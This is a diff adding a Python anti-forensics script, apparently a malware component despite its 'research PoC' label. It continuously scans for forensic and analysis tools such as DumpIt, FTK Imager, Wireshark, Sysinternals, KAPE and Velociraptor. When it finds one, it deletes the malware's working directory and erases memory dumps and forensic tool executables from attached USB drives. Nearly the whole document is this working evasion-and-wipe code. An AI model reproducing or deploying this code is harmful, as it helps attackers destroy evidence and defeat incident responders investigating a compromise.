@@ -1,0 +1,184 @@
+#detektor
+#!/usr/bin/env python3
+"""
+Advanced Live Forensics Detector + Data Wiper
+PC Terinfeksi - Auto-delete main directory & USB on detection
+WARNING: RESEARCH PoC ONLY - Destructive!
+"""
+
+import psutil
+import os
+import time
+import sys
+import shutil
+import subprocess
+from pathlib import Path
+import threading
+
+class ForensicDetectorWiper:
+    def __init__(self):
+        self.detected_tools = []
+        self.suspicious_ports = [9999, 13337, 4444, 31337, 8080]
+        self.forensic_extensions = ['.mem', '.raw', '.E01']
+        self.main_dir = os.getcwd()  # Current malware directory
+
+    def wipe_main_directory(self):
+        """Hapus semua data di main directory malware"""
+        print(f"💥 WIPING MAIN DIRECTORY: {self.main_dir}")
+        try:
+            for item in os.listdir(self.main_dir):
+                item_path = os.path.join(self.main_dir, item)
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                    print(f"   🗑️  Deleted: {item}")
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path, ignore_errors=True)
+                    print(f"   🗑️  Deleted folder: {item}")
+        except Exception as e:
+            print(f"   ⚠️  Wipe error: {e}")
+
+    def wipe_usb_drives(self):
+        """Hapus forensic dumps di semua USB drives"""
+        print("💥 WIPING USB FORENSIC DUMPS...")
+        usb_paths = []
+
+        # Find USB/removable drives
+        for partition in psutil.disk_partitions():
+            if 'removable' in partition.opts.lower():
+                usb_paths.append(partition.mountpoint)
+
+        for usb_path in usb_paths:
+            print(f"   🔍 Scanning USB: {usb_path}")
+
+            # Delete forensic files (*.mem, *.raw, *.E01)
+            for ext in self.forensic_extensions:
+                pattern = os.path.join(usb_path, f"*{ext}")
+                for file_path in Path(usb_path).glob(f"*{ext}"):
+                    try:
+                        file_path.unlink()
+                        print(f"   🗑️  USB Forensic dump deleted: {file_path}")
+                    except:
+                        pass
+
+            # Delete common forensic tool executables
+            forensic_tools = ['ftkimager.exe', 'dumpit.exe', 'imager.exe']
+            for tool in forensic_tools:
+                tool_path = os.path.join(usb_path, tool)
+                if os.path.exists(tool_path):
+                    try:
+                        os.remove(tool_path)
+                        print(f"   🗑️  Forensic tool deleted: {tool_path}")
+                    except:
+                        pass
+
+    def ultimate_wipe(self):
+        """Full anti-forensic wipe sequence"""
+        print("\n🔥 ULTIMATE WIPE SEQUENCE ACTIVATED")
+
+        # Threaded parallel wiping
+        wipe_threads = [
+            threading.Thread(target=self.wipe_main_directory),
+            threading.Thread(target=self.wipe_usb_drives)
+        ]
+
+        for t in wipe_threads:
+            t.start()
+
+        for t in wipe_threads:
+            t.join()
+
+        print("✅ WIPE COMPLETE - All traces destroyed")
+        sys.exit(0)
+
+    def detect_dumpit_ftk(self):
+        """DumpIt & FTK Imager detection"""
+        targets = ['dumpit.exe', 'ftkimager.exe', 'imager.exe']
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            try:
+                cmdline = ' '.join(proc.info['cmdline'] or []).lower()
+                if any(target in cmdline or target in proc.info['name'].lower()
+                       for target in targets):
+                    self.detected_tools.append("DumpIt/FTK")
+                    return True
+            except:
+                continue
+        return False
+
+    def detect_wireshark(self):
+        """Wireshark detection"""
+        patterns = ['wireshark.exe', 'tshark.exe', 'dumpcap.exe']
+        for proc in psutil.process_iter(['name', 'cmdline']):
+            try:
+                cmdline = ' '.join(proc.info['cmdline'] or []).lower()
+                if any(p in cmdline for p in patterns):
+                    self.detected_tools.append("Wireshark")
+                    return True
+            except:
+                continue
+        return False
+
+    def detect_process_tools(self):
+        """Process Hacker, Sysinternals detection"""
+        patterns = ['processhacker.exe', 'procexp.exe', 'procmon.exe']
+        for proc in psutil.process_iter(['name']):
+            try:
+                if any(p in proc.info['name'].lower() for p in patterns):
+                    self.detected_tools.append("Process Hacker")
+                    return True
+            except:
+                continue
+        return False
+
+    def detect_kape_velociraptor(self):
+        """KAPE & Velociraptor detection"""
+        patterns = ['kape.exe', 'velociraptor.exe', 'artifacts']
+        for proc in psutil.process_iter(['name', 'cmdline']):
+            try:
+                cmdline = ' '.join(proc.info['cmdline'] or []).lower()
+                if any(p in cmdline for p in patterns):
+                    self.detected_tools.append("KAPE/Velociraptor")
+                    return True
+            except:
+                continue
+        return False
+
+    def detect_usb_forensics(self):
+        """USB forensic dumps detection"""
+        for partition in psutil.disk_partitions():
+            if 'removable' in partition.opts.lower():
+                usb_path = partition.mountpoint
+                for ext in self.forensic_extensions:
+                    pattern = os.path.join(usb_path, f"*{ext}")
+                    if any(Path(usb_path).glob(f"*{ext}")):
+                        self.detected_tools.append(f"USB dump {ext}")
+                        return True
+        return False
+
+    def run_monitoring(self):
+        """Main detection loop"""
+        print("🔍 ADVANCED FORENSIC DETECTOR + WIPER")
+        print(f"Main directory protected: {self.main_dir}")
+        print("=" * 70)
+
+        try:
+            while True:
+                detections = [
+                    self.detect_dumpit_ftk(),
+                    self.detect_wireshark(),
+                    self.detect_process_tools(),
+                    self.detect_kape_velociraptor(),
+                    self.detect_usb_forensics()
+                ]
+
+                if any(detections):
+                    print(f"\n🚨 DETECTION CONFIRMED: {', '.join(self.detected_tools)}")
+                    self.ultimate_wipe()
+
+                time.sleep(0.2)  # 5Hz monitoring
+
+        except KeyboardInterrupt:
+            print("\n🛑 Stopped by user")
+
+if __name__ == "__main__":
+    wiper = ForensicDetectorWiper()
+    wiper.run_monitoring()
